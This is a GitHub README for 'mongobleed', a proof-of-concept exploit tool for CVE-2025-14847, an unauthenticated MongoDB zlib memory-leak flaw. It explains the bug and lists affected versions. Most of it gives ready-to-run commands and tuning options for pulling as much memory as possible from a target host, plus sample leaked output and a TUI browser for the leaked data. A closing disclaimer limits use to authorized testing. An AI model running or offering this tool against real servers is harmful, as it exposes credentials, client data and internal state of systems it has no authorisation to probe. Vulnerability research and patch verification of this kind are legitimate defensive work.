# mongobleed

**CVE-2025-14847** - MongoDB Unauthenticated Memory Leak Exploit

A proof-of-concept exploit for the MongoDB zlib decompression vulnerability that allows unauthenticated attackers to leak sensitive server memory.

## Vulnerability

A flaw in MongoDB's zlib message decompression returns the allocated buffer size instead of the actual decompressed data length. This allows attackers to read uninitialized memory by:

1. Sending a compressed message with an inflated `uncompressedSize` claim
2. MongoDB allocates a large buffer based on the attacker's claim
3. zlib decompresses actual data into the start of the buffer
4. The bug causes MongoDB to treat the entire buffer as valid data
5. BSON parsing reads "field names" from uninitialized memory until null bytes

## Affected Versions

| Version | Affected | Fixed |
|---------|----------|-------|
| 8.2.x | 8.2.0 - 8.2.2 | 8.2.3 |
| 8.0.x | 8.0.0 - 8.0.16 | 8.0.17 |
| 7.0.x | 7.0.0 - 7.0.27 | 7.0.28 |
| 6.0.x | 6.0.0 - 6.0.26 | 6.0.27 |
| 5.0.x | 5.0.0 - 5.0.31 | 5.0.32 |

## Usage

```bash
# Basic scan (offsets 20-1MB)
python3 mongobleed.py --host <target>

# Exact-size dump (single probe)
python3 mongobleed.py --host <target> --dump 10MB

# Dump with a small window around the target (more reliable)
python3 mongobleed.py --host <target> --dump 10MB --dump-window 2048

# Auto-tune dump size/window for best yield
python3 mongobleed.py --host <target> --auto

# Loop until stopped (Ctrl+C)
python3 mongobleed.py --host <target> --loop

# Optimized scanning strategy (sampling + hot offsets)
python3 mongobleed.py --host <target> --optimize --loop --decode

# Interactive TUI hexdump viewer
python3 mongobleed.py --host <target> --tui --loop

# Deep scan for more data
python3 mongobleed.py --host <target> --max-offset 50000

# Custom range
python3 mongobleed.py --host <target> --min-offset 100 --max-offset 20000

# Decode URL/unicode/base64 previews
python3 mongobleed.py --host <target> --decode
```

## Options

| Option | Default | Description |
|--------|---------|-------------|
| `--host` | localhost | Target MongoDB host |
| `--port` | 27017 | Target MongoDB port |
| `--min-offset` | 20 | Minimum document length to probe (accepts KB/MB) |
| `--max-offset` | 1048576 | Maximum document length to probe (accepts KB/MB) |
| `--buffer-extra` | 500 | Extra bytes for claimed uncompressed size (accepts KB/MB) |
| `--timeout` | 2.0 | Socket timeout in seconds |
| `--workers` | `max(4, cpu*10)` | Thread count |
| `--preview-bytes` | 80 | Bytes to show in console preview |
| `--max-empty-passes` | 1 | Stop after N passes with no new leaks |
| `--loop` | false | Keep looping until stopped |
| `--decode` | false | Decode URL/unicode/base64 previews |
| `--dump` | none | Single-probe claimed size like `10MB` or `512KB` |
| `--dump-window` | 0 | Probe +/- N bytes around dump size (0=auto) |
| `--auto` | false | Auto-tune dump size/window for best yield |
| `--auto-legacy` | false | Seed auto-tune with a legacy scan to find hot offsets |
| `--auto-min` | 20 | Min size for auto sweep |
| `--auto-max` | 10MB | Max size for auto sweep |
| `--auto-samples` | 8 | Samples per config in auto sweep |
| `--auto-mode` | speed | Optimize for `speed` (bytes/sec) or `size` (max bytes) |
| `--auto-timeout-max` | 300 | Max per-probe timeout in auto mode (seconds) |
| `--optimize` | false | Smarter scan strategy with sampling, hot offsets, and backoff |
| `--tui` | false | Interactive TUI hexdump browser |
| `--tui-rows` | 16 | Rows to render in TUI |
| `--tui-auto-size` | true | Auto-size rows based on terminal height |
| `--tui-refresh` | 1.0 | TUI refresh interval in seconds |
| `--hit` | none | Replay a specific hit token from output |
| `--hit-wiggle` | 0 | Probe +/- N bytes around hit offset when replaying (default 32 if flag used) |
| `--hit-backoff` | 0.2 | Seconds to sleep between hit replay loops |
| `--output` | auto | Output file for leaked data |

## Defaults

When you run with just `--loop --decode`, these defaults apply:

| Setting | Default |
|---------|---------|
| `--host` | localhost |
| `--port` | 27017 |
| `--min-offset` | 20 |
| `--max-offset` | 1048576 |
| `--buffer-extra` | 500 |
| `--timeout` | 2.0 |
| `--workers` | `max(4, cpu*10)` |
| `--preview-bytes` | 80 |
| `--max-empty-passes` | 1 |

## Example Output

```
[*] mongobleed - CVE-2025-14847 MongoDB Memory Leak
[*] Author: Joe Desimone - x.com/dez_
[*] Target: localhost:27017
[*] Scanning offsets 20-50000
[*] Output: leaked_localhost_27017_20250101_120000.bin

[+] offset=  117 len=  39: ssions^\\x01\\xf4r\\x9a\\x2aYDr\\xc3\\x90
[+] offset=16582 len=1552: MemAvailable:    8554792 kB\nBuffers: ...
[+] offset=18731 len=3908: Recv SyncookiesFailed EmbryonicRsts ...

[*] Total leaked: 8748 bytes
[*] Unique fragments: 42
[*] Saved to: leaked_localhost_27017_20250101_120000.bin
```

## Notes

- To request ~20MB buffers, target that size with `--max-offset 20971520` (and `--buffer-extra 0`).
- To keep a smaller scan range but request larger buffers, use `--buffer-extra` so `doc_len + buffer_extra` equals your target size.
- Use `--dump` for a single probe at an exact claimed size (e.g., `--dump 10MB`).
- `--dump` uses an automatic window when `--dump-window 0`; override it for tighter or wider scans.
- `--auto` ignores manual `--dump`/offset ranges and picks a size/window based on quick probes.
- `--auto-legacy` uses a legacy scan to bias auto toward hot offsets.
- In `--auto` mode, the window auto-expands after several empty passes to keep finding new leaks.
- Use `--auto-mode size` if you want maximum leak size instead of speed.
- `--optimize` reuses connections per worker and rotates between sampling and dense scans.
- Use the `hit=` token printed alongside a leak with `--hit` to replay the same probe.
- Add `--hit-wiggle` to probe around the hit offset for more leaks.
- Use `--hit-backoff` to slow down hit replay loops.
- TUI controls: Up/Down to move by 16 bytes, PageUp/PageDown to jump by a full screen, `q` to quit.
- TUI uses Textual (install with `pip install textual`) and supports resize automatically.
- Suggested TUI workflow:
  1) Run `--auto --loop --decode` to find hot offsets and capture a `hit=` token.
  2) Launch TUI with `--hit <token> --tui` to browse a live view around that offset.
- The effective cap is the server’s `maxMessageSizeBytes`; values above it will be rejected before parsing.

## Improvements

Compared to the original release, this fork adds:

- Multi-threaded scanning with configurable worker count
- Continuous scanning modes (`--loop` and `--max-empty-passes`)
- Automatic, timestamped output naming with host/port
- Unique-only output writing with append support across runs
- ASCII-safe previews to avoid mangled console output
- Optional decoding of URL/unicode/base64 previews (`--decode`)
- Escaped character cleanup for decoded previews (`\\uXXXX`, `\\xNN`, `\\n`, etc.)
- Hexdump fallback for non-readable leaks and `--hex` override
- Automatic dump size/window tuning (`--auto`)
- Optimized scanning mode with sampling + hot offsets (`--optimize`)
- Connection reuse per worker in optimize mode
- Hit replay tokens with `--hit` and wiggle/backoff support
- Textual-powered TUI live memory browser (`--tui`) with MC-style layout and refresh
- Suggested live-view workflow: run `--auto-mode speed --loop --decode --optimize` to find hot offsets, then use `--tui --hit <token>` to browse them
- Rich-formatted console logging
- Additional tunables (`--buffer-extra`, `--timeout`, `--preview-bytes`)
- KB/MB size parsing for offsets and buffer size

<img width="1095" height="627" alt="image" src="https://github.com/user-attachments/assets/39b22457-ac8e-4cea-9a0d-560c6d1faa49" />


## Test Environment

A Docker Compose file is included to spin up a vulnerable MongoDB instance:

```bash
docker-compose up -d
python3 mongobleed.py
```

## How It Works

The exploit crafts BSON documents with inflated length fields. When the server parses these documents, it reads field names from uninitialized memory until it hits a null byte. Each probe at a different offset can leak different memory regions.

Leaked data may include:
- MongoDB internal logs and state
- WiredTiger storage engine configuration
- System `/proc` data (meminfo, network stats)
- Docker container paths
- Connection UUIDs and client IPs

## References

- [OX Security Advisory](https://www.ox.security/blog/attackers-could-exploit-zlib-to-exfiltrate-data-cve-2025-14847/)
- [MongoDB Fix Commit](https://github.com/mongodb/mongo/commit/505b660a14698bd2b5233bd94da3917b585c5728)

## Credits

- Hamid Kashfi (@hkashfi)
- Codex (OpenAI)
- Joe Desimone - [x.com/dez_](https://x.com/dez_)

## Disclaimer

This tool is for authorized security testing only. Unauthorized access to computer systems is illegal.

## Requirements

- Python 3
- Rich (`pip install rich`)
